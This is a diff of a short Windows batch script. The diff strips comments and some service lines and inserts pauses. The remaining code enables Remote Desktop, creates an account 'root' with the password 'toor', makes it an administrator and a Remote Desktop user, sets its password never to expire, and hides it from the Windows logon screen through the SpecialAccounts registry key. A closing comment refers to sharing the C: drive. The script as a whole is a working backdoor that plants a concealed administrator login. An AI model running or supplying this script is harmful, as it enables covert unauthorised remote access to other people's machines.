@@ -1,31 +1,26 @@
 @echo off
-REM Enable Remote Desktop Protocol (RDP)
-echo Enabling Remote Desktop Protocol (RDP)...
-
-REM Set the registry key to enable Remote Desktop
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-REM Allow Remote Desktop through Windows Firewall
-netsh advfirewall firewall:enable rule name="Remote Desktop"
-
-REM Enable SMBv1 (if necessary, SMBv1 is deprecated but some legacy systems require it)
-echo Enabling SMBv1...
-sc config lanmanworkstation start= auto
-sc config lanmanserver start= auto
-sc start lanmanworkstation
-sc start lanmanserver
-
 pause
 
 net user root toor /add
 
+pause
+
 net localgroup Administrators root /add
+
+pause
 
 net localgroup "Remote Desktop Users" root /add
 
+pause
+
 net accounts /maxpwage:unlimited
 
+pause
+
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v root /t REG_DWORD /d "00000000" /f
+
+pause
  
 REM Batch file to share the C: drive over the network
 
